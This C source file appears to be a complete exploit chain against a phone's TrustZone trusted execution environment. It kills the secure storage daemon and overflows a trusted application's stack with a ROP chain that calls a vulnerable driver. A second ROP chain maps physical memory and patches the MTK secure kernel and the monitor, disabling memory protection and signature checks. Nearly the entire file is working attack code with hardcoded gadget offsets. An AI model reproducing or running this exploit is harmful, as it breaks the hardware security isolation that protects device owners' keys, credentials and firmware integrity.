#define _GNU_SOURCE
#include <stddef.h>
#include <sys/wait.h>
#include "MobiCoreDriverApi.h"
#include "dbg.h"
#include "tools.h"
#include "ta_s7_sem.h"
#include "ta_s7_validator.h"

// GADGETS TA
#define SEM_POP_R0_R1_R2_R3_R4_R5_R6_PC 0x3a6e + 1
#define SEM_BLX_R4_POP_R3_R4_R5_PC 0x15696 + 1
#define SEM_POP_R4_PC 0x10f8 + 1

// GADGETS DRV
#define DRV_POP_R0_R1_R2_R6_PC 0x9a5c + 1
#define DRV_POP_R3_R4_R5_PC 0x1710 + 1
#define DRV_DRAPIMAPPHYS_POP_R3_R4_R5_PC 0x1240E + 1
#define DRV_STR_R4_AT_R5_POP_R4_R5_R6_PC 0x9df6 + 1
#define TLAPI_ENTRY 0x7D01008

// TEE Kernel / Monitor offsets
#define OPCODE_THUMB_MOV_R0_1 0x0001F04F
#define OPCODE_ARM64_MOV_X0_0 0xD2800000
#define MTK_VIRT_BASE 0x07F00000
// ROM:07F01E6C 03 F0 C1 F8                 BL              is_mappable
#define MTK_PATCH_ADDR 0xFE500000 + (0x07F01E6C - MTK_VIRT_BASE)
// ROM:000000000202841C 06 0A 00 94                 BL              set_or_unset_secure_modem_memory
#define MON_PATCH1_ADDR 0x0202841C
// ROM:000000000203D800 00 00 00 00+signature_check_enabled_0 DCQ 0
#define MON_PATCH2_ADDR 0x0203D800
#define VIRT_ADDR_MTK 0x60000
#define VIRT_ADDR_MON1 0x61000
#define VIRT_ADDR_MON2 0x62000

#define P32(value) \
    add_u32(payload, &pos, value);
#define P64(value) \
    add_u64(payload, &pos, value);
#define ADD_PADDING(value, len) \
    add_padding(payload, &pos, value, len);
#define ADD_STR(str) \
    add_str(payload, &pos, str);
#define ADD_DATA(data, len) \
    add_data(payload, &pos, data, len);

void add_u32(uint8_t *payload, uint32_t *pos, uint32_t value)
{
    uint32_t *p = (uint32_t *)(payload + *pos);
    p[0] = value;
    *pos += 4;
}

void add_u64(uint8_t *payload, uint32_t *pos, uint64_t value)
{
    uint64_t *p = (uint64_t *)(payload + *pos);
    p[0] = value;
    *pos += 8;
}

void add_padding(uint8_t *payload, uint32_t *pos, uint8_t value, uint32_t len)
{
    uint8_t *p = (uint8_t *)(payload + *pos);
    memset(p, value, len);
    *pos += len;
}

void add_str(uint8_t *payload, uint32_t *pos, char *str)
{
    uint32_t len = strlen(str) + 1;
    uint8_t *p = (uint8_t *)(payload + *pos);
    memcpy(p, str, len);
    *pos += len;
}

void add_data(uint8_t *payload, uint32_t *pos, void *data, uint32_t len)
{
    uint8_t *p = (uint8_t *)(payload + *pos);
    memcpy(p, data, len);
    *pos += len;
}

int load_ta(mcSessionHandle_t *session, unsigned char *tci, uint32_t tciLen,
            unsigned char *ta_data, uint32_t ta_len)
{
    mcResult_t open_r = mcOpenDevice(MC_DEVICE_ID_DEFAULT);
    if (open_r != MC_DRV_OK)
    {
        err("mcOpenDevice\n");
        return 1;
    }

    mcResult_t opentrustlet_r = mcOpenTrustlet(
        session,
        0,
        ta_data,
        ta_len,
        tci,
        tciLen);
    if (opentrustlet_r != MC_DRV_OK)
    {
        return 1;
    }
    return 0;
}

int notify_ta(mcSessionHandle_t *session)
{
    if (mcNotify(session) != MC_DRV_OK)
    {
        warn("mcNotify\n");
    }
    if (mcWaitNotification(session, 20000) != MC_DRV_OK)
    {
        warn("mcWaitNotification\n");
    }
    return 0;
}

int map_in_ta(mcSessionHandle_t *session, void *data, uint32_t len, uint32_t *addr_in_ta)
{
    mcBulkMap_t map;
    if (mcMap(session, data, len, &map) != MC_DRV_OK)
    {
        return 1;
    }
    *addr_in_ta = map.sVirtualAddr;
    return 0;
}

int close_ta_session(mcSessionHandle_t *session)
{
    mcCloseSession(session);
    return 0;
}

int close_secure_storage_session()
{
    int secure_storage_pid = 0;
    // cat /proc/sys/kernel/pid_max : 5 chars + null + eol
    char pid_a[7] = {0};
    int fd = open("/dev/.secure_storage/secure_storage_daemon.lock", O_RDONLY);
    if (fd < 0)
    {
        err("Can't open secure_storage_daemon.lock\n");
        return 1;
    }
    if (read(fd, &pid_a, 6) <= 0)
    {
        err("Can't read secure_storage_daemon.lock\n");
        return 1;
    }
    close(fd);
    secure_storage_pid = atoi(pid_a);
    printf("pid : %d\n", secure_storage_pid);
    kill(secure_storage_pid, 9);
    return 0;
}

int main(int argc, char **argv)
{
    mcSessionHandle_t sem_session = {0};
    mcSessionHandle_t drv_session = {0};
    uint32_t tciLen = 0x20000;
    uint8_t *tci = mmap(NULL,
                        PAGE_ALIGN(tciLen),
                        PROT_READ | PROT_WRITE,
                        MAP_ANONYMOUS | MAP_PRIVATE,
                        0,
                        0);

    uint32_t *wsm_mem = mmap(NULL,
                             0x1000,
                             PROT_READ | PROT_WRITE,
                             MAP_ANONYMOUS | MAP_PRIVATE,
                             0,
                             0);
    uint32_t *wsm_mem2 = mmap(NULL,
                              0x1000,
                              PROT_READ | PROT_WRITE,
                              MAP_ANONYMOUS | MAP_PRIVATE,
                              0,
                              0);

    if (load_ta(&sem_session, tci, tciLen,
                ta_s7_fffffffff0000000000000000000001b_tlbin,
                ta_s7_fffffffff0000000000000000000001b_tlbin_len))
    {
        err("Can't load SEM TA\n");
        return 1;
    } else {
        ok("SEM TA loaded\n");
    }

    while (1) {
        /* secure storage daemon uses the driver, we need to kill it */
        close_secure_storage_session();
        if (load_ta(&drv_session, tci, 104,
                    ta_s7_ffffffffd00000000000000000000004_tlbin,
                    ta_s7_ffffffffd00000000000000000000004_tlbin_len)) {
            err("Can't load VALIDATOR DRV\n");
        } else {
            ok("VALIDATOR DRV loaded\n");
            break;
        }
    }

    uint32_t rop_chain_drv[] = {
        /* STEP 1 MAP MTK AND PATCH IT */
        DRV_POP_R0_R1_R2_R6_PC,					  // map physical page, prepare arguments (1/2)
        VIRT_ADDR_MTK,							  // R0 (requested virtual address)
        0x1000,									  // R1 (size to map)
        MTK_PATCH_ADDR & 0xFFFFF000,			  // R2 (physical address to map)
        0,										  // R6 (unused)
        DRV_POP_R3_R4_R5_PC,					  // map physical page, prepare arguments (2/2)
        0x103,									  // R3 (attributes : read + write)
        0,										  // R4 (unused)
        0,										  // R5 (unused)
        DRV_DRAPIMAPPHYS_POP_R3_R4_R5_PC,		  // Call DrApiMapPhys
        0,										  // R3 (unused)
        OPCODE_THUMB_MOV_R0_1,					  // R4 (value to patch: mov r0, 1 in thumb mode)
        VIRT_ADDR_MTK + (MTK_PATCH_ADDR & 0xFFF), // R5 (virtual address to patch)
        DRV_STR_R4_AT_R5_POP_R4_R5_R6_PC,		  // Patch MTK !
        0,										  // R4 (unused)
        0,										  // R5 (unused)
        0,										  // R6 (unused)

        /* STEP 2 MAP MONITOR AND PATCH IT : don't set memory secure */
        DRV_POP_R0_R1_R2_R6_PC,						// map physical page, prepare arguments (1/2)
        VIRT_ADDR_MON1,								// R0 (requested virtual address)
        0x1000,										// R1 (size to map)
        MON_PATCH1_ADDR & 0xFFFFF000,				// R2 (physical address to map)
        0,											// R6 (unused)
        DRV_POP_R3_R4_R5_PC,						// map physical page, prepare arguments (2/2)
        0x103,										// R3 (attributes : read + write)
        0,											// R4 (unused)
        0,											// R5 (unused)
        DRV_DRAPIMAPPHYS_POP_R3_R4_R5_PC,			// Call DrApiMapPhys
        0,											// R3 (unused)
        OPCODE_ARM64_MOV_X0_0,						// R4 (value to patch: mov x0, 0 in arm64)
        VIRT_ADDR_MON1 + (MON_PATCH1_ADDR & 0xFFF), // R5 (virtual address to patch)
        DRV_STR_R4_AT_R5_POP_R4_R5_R6_PC,			// Patch Monitor !
        0,											// R4 (unused)
        0,											// R5 (unused)
        0,											// R6 (unused)

        /* STEP 3 TEST MAP MONITOR AND PATCH IT : disable signature checks */
        DRV_POP_R0_R1_R2_R6_PC,						// map physical page, prepare arguments (1/2)
        VIRT_ADDR_MON2,								// R0 (requested virtual address)
        0x1000,										// R1 (size to map)
        MON_PATCH2_ADDR & 0xFFFFF000,				// R2 (physical address to map)
        0,											// R6 (unused)
        DRV_POP_R3_R4_R5_PC,						// map physical page, prepare arguments (2/2)
        0x103,										// R3 (attributes : read + write)
        0,											// R4 (unused)
        0,											// R5 (unused)
        DRV_DRAPIMAPPHYS_POP_R3_R4_R5_PC,			// Call DrApiMapPhys
        0,											// R3 (unused)
        0,											// R4 (value to patch: 0 disable signature checks)
        VIRT_ADDR_MON2 + (MON_PATCH2_ADDR & 0xFFF), // R5 (virtual address to patch)
        DRV_STR_R4_AT_R5_POP_R4_R5_R6_PC,			// Patch Monitor !
        0,											// R4 (unused)
        0,											// R5 (unused)
        0,											// R6 (unused)

        /* STEP 4 exit */
        0xC682 + 1, // lazy way to make driver exits
    };

    uint32_t wsm_addr = 0;
    if (map_in_ta(&sem_session, wsm_mem, 0x1000, &wsm_addr)) {
        printf("can't map\n");
    }
    uint32_t wsm_addr2 = 0;
    if (map_in_ta(&sem_session, wsm_mem2, 0x1000, &wsm_addr2)) {
        printf("can't map\n");
    }

    wsm_mem[0] = 0xF;
    wsm_mem[1] = 0x0; // SPID
    wsm_mem[2] = wsm_addr + 12;

    wsm_mem[3 + 512 / 4] = 0x120 + 7 * 4 + sizeof(rop_chain_drv); // memcpy size

    memcpy(&wsm_mem[146], rop_chain_drv, sizeof(rop_chain_drv));

    uint8_t *payload = tci;
    uint32_t pos = 0;

    strcpy((char *)wsm_mem2, "Exploit OK\n");
    
    // driver_id : 0x00040002
    // cmd_id    : 0xF
    // tlApi_entry : 0x7D01008 (check RTM task at tlApi_entry address : 0x108C)


    uint32_t rop_chain_sem[] = {
        SEM_POP_R0_R1_R2_R3_R4_R5_R6_PC,
        8,			   // r0: API id (call_driver)
        0x00040002,	   // r1: validator driver id
        wsm_addr,	   // r2: ipc memory to communicate with the driver
        0,			   // r3
        0,			   // r4
        0,			   // r5
        0,			   // r6
        SEM_POP_R4_PC, // pc
        TLAPI_ENTRY,
        SEM_BLX_R4_POP_R3_R4_R5_PC, // jump on TLAPI_ENTRY to start call_driver
        0,							// r3
        0,							// r4
        0,							// r5
        SEM_POP_R0_R1_R2_R3_R4_R5_R6_PC,
        5,			// r0 api id (print log)
        wsm_addr2,	// r1 string to print
        0,			// r2
        0,			// r3
        0,			// r4
        0,			// r5
        0,			// r6
        TLAPI_ENTRY // jump on TLAPI_ENTRY to start print logggV
    };

    P32(7)										   // CMD_ID
    ADD_PADDING('A', 0x11bc)					   // padding stack
    P32(wsm_addr)								   // R4
    P32(0x55555555)								   // R5
    P32(0x66666666)								   // R6
    P32(0x77777777)								   // R7
    P32(0x88888888)								   // R8
    ADD_DATA(rop_chain_sem, sizeof(rop_chain_sem)) // add rop_chain
    ADD_PADDING('A', 0x16808 - pos)				   // padding to len
    P32(0x11cc + sizeof(rop_chain_sem))			   // memcpy len

    notify_ta(&sem_session);

    close_ta_session(&sem_session);
    close_ta_session(&drv_session);

    return 0;
}
